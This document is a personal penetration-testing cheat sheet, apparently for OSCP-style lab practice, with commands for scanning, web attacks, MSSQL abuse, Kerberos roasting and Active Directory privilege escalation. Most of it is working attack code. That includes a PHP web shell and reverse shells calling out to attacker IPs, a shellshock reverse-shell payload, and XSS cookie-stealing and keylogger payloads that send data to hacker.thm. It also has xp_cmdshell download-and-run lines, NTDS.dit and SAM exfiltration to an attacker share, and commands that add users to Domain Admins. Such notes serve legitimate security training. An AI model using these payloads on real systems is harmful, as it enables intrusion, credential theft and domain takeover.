---
description: These are all the notes in one place unorganized
---

# All Notes

**Get Proof Details From Original Location & Screenshot**

```
Linux
hostname && whoami && cat proof.txt && ip a

Windows (Cmd)
hostname && whoami && type user.txt && ipconfig /all
hostname && whoami && type root.txt && ipconfig /all
hostname && whoami && type proof.txt && ipconfig /all
hostname && type proof.txt && ipconfig /all

Windows (Powershell)
hostname; whoami; type local.txt; ipconfig /all
hostname; whoami; type proof.txt; ipconfig /all
hostname; whoami; type user.txt; ipconfig /all
hostname; whoami; type root.txt; ipconfig /all
```

## HackTricks

hacking trick/technique/whatever learnt in CTFs, real life apps, and reading researches and news. Here you will find the typical flow that you should follow when pentesting one or more machines.

https://book.hacktricks.xyz/welcome/readme

Liodeus OSCP CheatSheet https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html

## OWASP Cheat Sheets

a concise collection of high value information on specific application security topics. These cheat sheets were created by various application security professionals who have expertise in specific topics.

[OWASP Testing GuideV4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP\_Testing\_Guide\_v4.pdf)

[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)

[Pwning OWASP Juice Shop](https://pwning.owasp-juice.shop/)

[OWASP Top 10 2021](https://owasp.org/Top10/)

## Scanning

Scan Multiple Hosts File Required

```
autorecon -t targets.txt --dirbuster.tool ffuf --dirbuster.threads 40 --dirbuster.wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt --nmap-append="--script-timeout=30s" --no-port-dirs --reports markdown -o ./ -vv
```

Scan Single Target

```
autorecon IP --dirbuster.tool ffuf --dirbuster.threads 40 --dirbuster.wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt --nmap-append="--script-timeout=30s" --no-port-dirs --reports markdown -o ./ -vv
```

Proxychains autorecon

{% code overflow="wrap" %}
```
proxychains autorecon -t oscp/lab/ITNetwork.txt --dirbuster.tool ffuf --dirbuster.threads 50 --no-port-dirs --reports markdown -o /tmp -vv --proxychains --nmap="-vv --reason -Pn -T5"
```
{% endcode %}

```
sudo nmap -n -v -sT -A <IP> -Pn
```

```
sudo nmap -n -v -sT -A -p- <IP> -Pn
```

```
sudo nmap -n -v -sT -A -p<ports discovered> <IP> -Pn — script vuln
```

```
sudo nmap -n -v -sU -Pn <IP>
```

```
sudo nmap -n -v -sU -p- -T5 -Pn <IP>
```

{% code overflow="wrap" %}
```
run an nmap scan, then google “<xyz service> pentesting” and 9 times out of 10 will click on a link from book.hacktricks.xyz or “<xyz service> exploit” if I can find the name and version.
```
{% endcode %}

## Enumeration

OSCP Learning Path

https://help.offensive-security.com/hc/en-us/articles/360050473812-PEN-200-Labs-Learning-Path

All Rounded Enumeration

https://www.xmind.net/m/QsNUEz/

Active Directory Enumeration

https://www.xmind.net/m/5dypm8/

### HTTP

#### htaccess

Password Attack with medusa

```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/path
```

View the website View source code

* comments
* `<a` href tags
* directories such as /assets/
* download with curl

#### developer tools

manually review a web application for security issues using only the in-built tools in your browser.

* Element inspector -- assists us with this by providing a live representation of what is currently on the website. ability to modify div parameters etc.
* debugger -- digging deep into the JavaScript code. search for js files. use pretty print option to better view js. use breakpoints by clicking on code number line to stop execution. refresh page to view.
* network -- used to keep track of every external request a webpage makes.

#### content discovery

ways of discovering hidden or private content on a webserver that could lead to new vulnerabilities.

* favicon -- can give us a clue on what framework is in use. run `curl http://target/path/to/favicon.ico | md5sum` take the md5sum and pass it to https://wiki.owasp.org/index.php/OWASP\_favicon\_database to find the framework
* sitemap.xml -- can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.
* Http headers -- run `curl http://target/ -v` contain useful information such as the webserver software and possibly the programming/scripting language in use
* Framework Stack -- Once you've established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework's website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.
* wappalyzer -- https://www.wappalyzer.com/ helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version number.
* wayback machine -- https://archive.org/web/ a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current
* Github -- You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn't yet found
* s3 buckets -- a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. the format of the S3 buckets is `http(s)://{name}.s3.amazonaws.com` where `{name}` is decided by the owner, such as `tryhackme-assets.s3.amazonaws.com`. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as `{name}-assets`, `{name}-www`, `{name}-public`, `{name}-private`, etc.

#### subdomain enumeration

* ssl/tls certificates -- to discover subdomains belonging to a domain, sites like https://crt.sh and https://transparencyreport.google.com/https/certificates offer a searchable database of certificates that shows current and historical results.
* search engines -- search term -site:www.tryhackme.com site:\*.tryhackme.com, which should reveal a subdomain
* dns bruteforce

```
dnsrecon -t brt -d domain.com
```

* [Sublist3r](https://github.com/aboul3la/Sublist3r) run `./sublist3r.py -d example.com`
* Virtual Hosts -- `ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.example.com" -u http://MACHINE_IP` add `-fs size` to filter for non-valid subdomains

#### Authentication Bypass

* user enumeration -- `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://target/ -mr "username already exists"`
* brute force -- `ffuf -w users.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.199.37/customers/login -fc 200`
* logic flaws -- flaw in the logic code
* cookie tampering -- Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges
* Insecure Direct Object Reference (IDOR) -- when a server does not check for the user thats currently logged in against the requested url. urls can contian ids etc. if you are able replace the data to something else and can see the data this confirms the vulnerability. Unpredictable Ids If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number. The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.

#### Contaminating Log Files

nc $ip port

```
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

```
curl http://$ip/include.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

```
curl http://$ip/include.php?file=/var/log/apache2/access.log&cmd=ifconfig
```

#### File inclusion

Local File inclusion

* `../../etc/passwd`
* `../../etc/passwd%00`
* `../../etc/passwd0x00`
* `....//....//....//....//....//etc/passwd`
* `/etc/passwd/.`
* `/./././././././././././etc/passwd`
* if you are able to view the ssh log `/var/log/auth.log` try "poisoning" the log by ssh as `ssh '<?php system($_GET['cmd']); ?>'@targetip` this entry may or may not the user in the logs but still proceed with `php -r '$sock=fsockopen("yourIP",port);exec("/bin/sh -i <&3 >&3 2>&3");'` <--- Url encode this with burp
* if ftp allows uploading of files you can call the script to gain a php reverse shell

Remote File inclusion -- One requirement for RFI is that the `allow_url_fopen` option needs to be `on` `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.php`

#### Server-Side Request Forgery (SSRF)

```
A successful SSRF attack can result in any of the following:    
1. Access to unauthorised areas.
2. Access to customer/organisational data.
3. Ability to Scale to internal networks.
4. Reveal authentication tokens/credentials.
```

* `https://website.thm/item/2?server=server.website.thm/flag?id=9&x=` is equal to `https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2`
*   Finding an SSRF

    When a full URL is used in a parameter in the address bar:

    ![](2022-02-12-01-19-24.png)

    A hidden field in a form:

    ![](2022-02-12-01-18-36.png)

    A partial URL such as just the hostname:

    ![](2022-02-12-01-20-09.png)

    Or perhaps only the path of the URL:

    ![](2022-02-12-01-21-47.png)

    If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.

#### Cross Site Scripting

Based on JavaScript. an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

Demonstrate that you can achieve XSS on a website

```
<script>alert('XSS');</script>
```

```
"><script>alert('THM');</script>
```

```
</textarea><script>alert('THM');</script>
```

```
';alert('THM');//
```

```
<sscriptcript>alert('THM');</sscriptcript>
```

```
/images/cat.jpg" onload="alert('THM');
```

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

Session stealing

```
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

Content Injection

```
<iframe src=http://172.16.0.1/thescriptkid.html height=”0” width=”0”></iframe>
```

Key logger

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

Business logic

For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

```
<script>user.changeEmail('attacker@hacker.thm');</script>
```

**Reflected XSS**

Happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

Test every possible point of entry; these include:

Parameters in the URL Query String URL File Path Sometimes HTTP Headers (although unlikely exploitable in practice)

A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.

![](2022-02-12-11-50-13.png)

![](2022-02-12-11-50-18.png)

The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.

![](2022-02-12-11-50-39.png)

![](2022-02-12-11-50-44.png)

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

**Stored XSS**

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

Test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

Comments on a blog User profile information Website Listings

**Dom Based XSS**

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

How to test for Dom Based XSS:

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.

**Blind XSS**

You can't see the payload working or be able to test it against yourself first.

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed. A popular tool for Blind XSS attacks is xsshunter. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

#### Command Injection

Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with.

The curl command is a great way to test for command injection. This is because you are able to use curl to deliver data to and from an application in your payload. Take this code snippet below as an example, a simple curl payload to an application is possible for command injection.

```
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
```

Applications that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators `;`, `&` and `&&`

Command Injection can be detected in mostly one of two ways:

**Blind command injection**

Another method of detecting blind command injection is by forcing some output. This can be done by using redirection operators such as `>`. If you are unfamiliar with this, I recommend checking out the Linux fundamentals module. For example, we can tell the web application to execute commands such as `whoami` and redirect that to a file. We can then use a command such as `cat` to read this newly created file’s contents.

**Verbose command injection**

#### SQL Injection (May need Burp)

The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

[MSSQL Practical Injection Cheat Sheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)

Blind based MSSQL injection through web app. will delay web page for 5 seconds if user is sa

```
' if (select user) != 'sa' waitfor delay '0:0:5'--
```

run responder and attemp to capture hash.

```
'+EXEC+master.sys.xp_dirtree+'\\AttackerIP\share--
```

Login it to mssql remotely

```
sqsh -S $ip -U sa -P <PASSWORD>
```

alternatively use

```
mssqlclient.py user:password@$ip -windows-auth
```

or without --windows-auth

```
mssqlclient.py user:password@$ip
```

Check for users with SA level permissions (users that can enable xp\_cmdshell)

```
select IS_SRVROLEMEMBER ('sysadmin')
```

Run after spinning up an smbserver to capture hash

```
exec xp_dirtree '\\<attacker ip>\<share name>\',1,1
```

**Check if xp\_cmdshell is enabled**

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

**Show Advanced Options**

```
sp_configure 'show advanced options', '1'
```

```
RECONFIGURE
```

**Enable xp\_cmdshell**

```
sp_configure 'xp_cmdshell', '1'
```

```
RECONFIGURE
```

```
EXEC master..xp_cmdshell 'whoami'
```

```
xp_cmdshell powershell iex(new-objectnet.webclient).downloadstring(\"http://AttackerIP/Invoke-PowerShellTcp.ps1\")
```

after every command

```
go
```

**Enumerating MSSQL**

Get all available databases

```
SELECT name FROM master.dbo.sysdatabases
```

Get everything in relation to tables from a database of interest

```
SELECT * FROM DatabaseOfInterest.INFORMATION_SCHEMA.TABLES
```

Get everything in relation to columns from a database of interest

```
SELECT * FROM DatabaseOfInterest.INFORMATION_SCHEMA.COLUMNS
```

Change to another database

```
use DatabaseOfInterest
```

Extract Data

```
select Column_Of_Interest,Column_Of_Interest from Table_Of_Interest
```

[MySQL SQL Injection Practical Cheat Sheet](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)

[Union Based Oracle Injection](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html)

* `https://website.thm/blog?id=1` == `SELECT * from blog where id=1 and private=0 LIMIT 1;` and can be injected with `https://website.thm/blog?id=2;--` which will then look like `SELECT * from blog where id=2;-- and private=0 LIMIT 1;` The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query: `SELECT * from blog where id=2;--`

1. `'` `"` -- find injection points
2. `0 UNION SELECT 1,2,database()` -- this will depend on how many columns are available. two in 3 in this case.
3. `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database'` -- will display tables from database
4. `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'table'` -- will display columns from table
5. `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM table` -- will display user and pass from table
6. `' OR 1=1;--` 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.

*   the `LIKE` operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and \_ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s. `admin123' UNION SELECT 1,2,3 where database() like 's%';--`

    Now you move onto the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%' etc. Keep on with this process until you discover all the characters of the database name, which is sqli\_three.
* `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--` now finding the username table
* `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='analytics_referre_s' and COLUMN_NAME like 'a%';` -- now enumerating users finding columns
* `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';` -- continue to find more columns
* `admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%` -- find password
* Time based sql example, when trying to establish the number of columns in a table, you would use the following query:
  * `admin123' UNION SELECT SLEEP(5);--` If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:
  * `admin123' UNION SELECT SLEEP(5),2;--` This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.
* run nikto -h url\`
* davtest -auth user:pass -url http://127.0.0.1/ if webdav enabled may give us reverseshell with or without credentials
* uploading files to gain reverseshell. which extensions are allowed?
  * .php
  * .php3
  * .php4
  * .php5
  * .phtml
* PHP `"strcmp"` vulnerability `user="x"pass[]="x"` for authentication bypass. square brackets
* search application names, version numbers, to find associated known vulnerabilities with google
* search for every php parameter for a potential directory traversal `../../etc/passwd` you may or may not need to increase the amount of directories needed(`../`)
* docker run -it milo2012/pathbrute -u http://10.129.95.233/ -s default -i -n 20
* run "gobuster" to find common directories and pages
  * common.txt
  * big.txt
* look for generated error/messages; this may lead to finding the application name
* download the version software if possible or the closest version
* can you edit the server PHP code to include a reverse shell
* look for any names that can be used as usernames and or passwords
* Bruteforce possible hidden website parameters
  * `wfuzz -u website/file.php?FUZZ=/etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hw 0`
* if there is a robots.txt file or disallow list that can only be read with an "Engine User Agent" use wfuzz with -H "User-Agent: FUZZ" and the seclists useragent.fuzz.txt wordlists
* if the target has multiple webservers there is a possiblity that when uploading files they will upload that file to another webserver on a different port
* password attack and login pages with any potential usernames or default credentials
* NagiosXI 5.6.6 and below
  * vulnerable to RCE; metasploit module `nagios_xi_plugins_check_plugin_authenticated_rce`
* Drupal 7
  * vulnerable to property injection in the Forms api; metasploit module `drupal_drupalgeddon2`
* Koken 0.22.24
  * vulnerable to Arbitrary File Upload (Authenticated); [48706](https://www.exploit-db.com/exploits/48706)
* shellshock vulnerability cgi
  * curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://192.168.130.87/cgi-bin/vulnerable
  * curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/80 0>&1'" http://$ip/cgi-bin/vulnerable.sh
* Manage Engine ServiceDesk Plus 7.6.0
  * vulnerable to ManageEngine (Multiple Products) - (Authenticated) Arbitrary File Upload (Metasploit) metasploit module `manageengine_auth_upload`
    * To mannually exploit use python script [35845](https://raw.githubusercontent.com/AndyCyberSec/OSCP/master/35845.py)

### Kerberos

#### MS14-068

```
cd /usr/share/windows-kernel-exploits/MS14-068/pykek
```

```
rpcclient $ip -U SomeUser
```

```
lookupname SomeUser
```

```
python2 ./ms14-068.py -u user@domain.local -p SomePassword -d $ip -s SID
```

```
impacket-goldenPac domain.local/SomeUser:SomePassword@dc.domain.local
```

#### Validate users

```
kerbrute userenum users.txt -d example.com --dc 127.0.0.1
```

#### ASREPRoasting

This will get a "ticket" meaning the users have the "UF\_DONT\_REQUIRE\_PREAUTH" set and will return a hash to crack

```
python3 /usr/local/bin/GetNPUsers.py $domain/ -no-pass -usersfile users.txt -dc-ip $ip
```

#### Kerberosting

```
python3 /usr/local/bin/GetUserSPNs.py example.com/user:password -dc-ip 127.0.0.1 -request
```

```
Invoke-Kerberoast
```

### RPC Bind

#### Showmount

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 127.0.0.1
```

Can you mount the Network file share?

```
mount -t cifs //<IP>/Backups /mnt/remote -o rw
```

```
rpcclient -U username/IP -- to log in
```

Retrive current logged in user privileges

```
enumprivs
 -- to retrive current logged in user privileges
```

Blindy check if you can change password

```
setuserinfo username 23 Password!
```

### RPC

rpcdump.py 127.0.0.1 -p 135

_Print Nightmare_

https://github.com/calebstewart/CVE-2021-1675

https://github.com/cube0x0/CVE-2021-1675

Check For PrintNightmare

```
rpcdump.py @$ip | egrep 'MS-RPRN|MS-PAR'
```

If the output is the following contains the following, it is vulnerable.

```
Print System Aschronous Remote Protocol
Print System Remote Protocol
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=$tun0 lport=53 -f dll -o /opt/winreconpack/thescriptkid.dll
```

```bash
python3 printnightmare.py domain.local/user:password@$ip '\\$tun0\winreconpack\thescriptkid.dll'
```

### LDAP

Active Directory

Add domain name to “/etc/hosts” file

Any time you get creds re-run all of the remote AD tools against it with the creds (GetNPUsers, GetUserSPNs, secretsdump, etc).

Once you have access to the next box do it all over again. You may get lucky and get domain admin creds from the first box, or you may have to privesc again and re-roll through the process. This is where Bloodhound comes in handy, it’ll show you what permissions the accounts have that you found creds for. Some creds may work on multiple boxes, use crackmapexec to verify the creds with EVERY IP in the domain, don’t stop at the first box that works. Don’t forget to check the permissions/groups your current user is in. You may not find creds to another user, but your current one may have special permissions that allow you to modify access to resources, run certain processes as SYSTEM, or create new users or add them to certain groups.

**Permissions For easy Win**

members of _Server-Operator_ can for example stop start services(sc.exe) and modify _binPath="C:\Path\to\evil.exe"_

![](20220714192737.png)

[Active Directory Methology](https://book.hacktricks.xyz/windows/active-directory-methodology)

[Attacking Active Directory](https://adsecurity.org/?page\_id=4031)

[Active Directory Exploitation Cheat sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

[Notes About Red Teaming](https://www.ired.team/)

```
ldapsearch -v -x -b "DC=example,DC=com" -H "ldap://127.0.0.1" "(objectclass=*)"
```

This will potentially retrieve local admin using windows password Local Administrator Password Solution (LAPS)

```
ldapsearch -x -H ldap://10.129.78.201 -D "SABatchJobs" -w SABatchJobs -b "dc=megabank,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

Enumerate AD users. sometimes guest is enabled!

```
windapsearch --domain example.com --dc-ip 127.0.0.1 -u example\\guest -p password -U
```

Enumerate domain admins. requires credentials

```
windapsearch --domain example.com --dc-ip 127.0.0.1 -u example\\user -p password --da
```

More enumeration on domain admins. requires crednetials

```
windapsearch --domain example.com --dc-ip 127.0.0.1 -u example\\user -p password -C
```

```
crackmapexec ldap 127.0.0.1 -u guest -p "" --kdcHost 127.0.0.1
```

```
crackmapexec ldap 127.0.0.1 -u username -p /usr/share/wordlists/rockyou.txt --kdcHost 127.0.0.1
```

run windows command; if setting up revershell, use powershell and escape $ characters with \\

```
crackmapexec smb 127.0.0.1 -u user -p password -x command
```

Hash dictionary attack

```
crackmapexec smb 127.0.0.1 -u users.txt -H NThashes.txt --continue-on-success
```

Hash spray

```
crackmapexec smb 127.0.0.1 -u users.txt -H :hash --continue-on-success --local-auth
```

Password dictionary attack

```
crackmapexec smb 127.0.0.1 -u users.txt -p passwords.txt --continue-on-success
```

This will dump domain credentials and or kerberos tickets. can be used with rdp session

```
secretsdump.py domain.com/username:password@127.0.0.1
```

```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

This will give us command prompt if port 5985 is open and user is allowed WinRM using Passing The Hash technique

```
evil-winrm -i 127.0.0.1 -u username -H NTML_HASH
```

This will give us command prompt if port 5985 is open and user is allowed WinRM using normal username and password

```
evil-winrm -i 127.0.0.1 -u username -p password
```

With Valid Creds use to enumerate AD as user rerun after gaining more privileges

```
. .\SharpHound.ps1;Invoke-BloodHound -CollectionMethod All
```

```
.\SharpHound.exe -c all --collectallproperties --ldapusername daisy.jordan --ldappassword Sprinkles1 -d bigturtleboys.local
```

Start Bloodhound

```
bloodhound-python -u username -p password  -d return.local -ns 10.129.95.241 -c all
```

or

```
neo4j start
/opt/bloodhound/BloodHound-linux-x64/BloodHound --no-sandbox > /dev/null &
```

Runs In Current Working Directory neo4j:neo4j

```
xhost + && sudo docker run -dt -v /tmp/.X11-unix/:/tmp/.X11-unix -v $(pwd):/root -e DISPLAY=$DISPLAY --network host --device /dev/dri/card0 --name bloodhound bannsec/bloodhound
```

Get a deleted object/user properties that may include legacy password pwd base64

```
Get-ADObject -Filter {displayName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *
```

_Bypassing AMSI_

```
Bypass-4MSI
```

_Server-Operator_

```
stop start services(sc.exe) and modify *binPath="C:\Path\to\evil.exe"* 
```

_Account Operators_

```
net user thescriptkid thescriptkid /add /domain
net group "Some Non-Protected group but placing the new user in a group with WriteDACL" thescriptkid /add
net localgroup "Remote Management Users" thescriptkid /add
```

_Write DACL_

```
$SecPassword = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUser,$SecPassword

Add-ObjectACL -PrincipalIdentity compromiseduser -Credential $cred -Rights DCSync

secretsdumps.py domain/user@IP
```

**SeRestorePrivilege (by itself)**

```
.\SeRestoreAbuse.exe "cmd /c net user thescriptkid thescriptkid /add"
```

```
.\SeRestoreAbuse.exe "cmd /c net localgroup administrators thescriptkid /add"
```

```
secretsdump.py domain.local/user:password@$ip
```

_SeBackupPrivilege SeRestorePrivilege_

```
reg.exe save hklm\sam sam.save
reg.exe save hklm\system system.save
```

```
robocopy /b c:\users\administrator\desktop\ c:\
```

_NTDS.dit and System.hive_

```
echo "Y" | wbadmin start backup -backuptarget:\\192.168.49.207\exfiltrate -include:c:\windows\ntds
```

```
wbadmin get versions - to get the Version identifier: 00/00/0000-00:00
```

```
echo "Y" | wbadmin start recovery -version:00/00/0000-00:00 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\ -notrestoreacl
```

```
reg save HKLM\SYSTEM c:\system.hive
```

```
cp ntds.dit \\attackingIP\share\ntds.dit
```

```
cp system.hive \\attackingIP\share\system.hive
```

```
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
```

_GetChangesAll (DCSync)_

```
secretsdump.py domain/user@ip
```

_ReadGMSApassword remotely_

```
python2 /opt/gMSADumper/gMSADumper.py -d intelligence.htb -u ted.graves -p Mr.Teddy

*may need to use ntpdate domain if you get clockscrew error*

getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :ee6ba16bad56e4fd9cc2a4156710cd2d
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

export KRB5CCNAME=Administrator.ccache
add dc hostname to /etc/hosts
wmiexec.py -k -no-pass dc.intelligence.htb
```

\*ReadGMSApassword Without PowerView

```
$gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties 'msds-managedpassword'
$mp = $gmsa.'msds-managedpassword'
$mp1 = ConvertFrom-ADManagedPasswordBlob $mp 
$user = 'BIR-ADFS-GMSA$' 
$passwd = $mp1.'CurrentPassword'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = new-object system.management.automation.PSCredential $user,$secpass
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -force)} -Credential $cred
```

ReadGMSApassword EXE

```
.\GMSAPasswordReader.exe --AccountName 'Target_Account'
```

_ForceChangePassword_

```
$SecPassword = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUser,$SecPassword
$UserPassword = ConvertTo-SecureString 'LateralEscUserPass' -AsPlainText -Force
Set-DomainUserPassword -Identity LateralEscUserName -AccountPassword $UserPassword -Credential $Cred
```

_GenericAll_

```
$CompromisedUserName = 'CompromisedUserName'
$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass

Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity LateralEscUserName -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'password' -force)} -Credential $cred
```

_GenericWrite_

_use this for reverseshell using scriptpath=, enumeration, or use serviceprincipalname= for kerberoast_

```
$CompromisedUserName = 'CompromisedUserName'
$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{serviceprincipalname='thescriptkid/thescriptkid'} 
Get-DomainSPNTicket -Credential $Cred LateralEscUserName | fl
OR 
Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{scriptpath='C:\\path\\to\\script.ps1'}
```

_WriteOwner_

```
$CompromisedUserName = 'CompromisedUserName'
$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass

Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity CompromisedUser
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -PrincipalIdentity CompromisedUser -Rights All
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CompromisedUser' -Credential $Cred
```

_WriteOwner_ (For User)

```
$Password = ConvertTo-SecureString '@Password!' -AsPlainText -Force
```

```
$TargetUser = 'TargetUser'
```

```
$CompromisedUser = 'CompromisedUser'
```

```
Set-DomainObjectOwner -Identity $TargetUser -OwnerIdentity $CompromisedUser
```

```
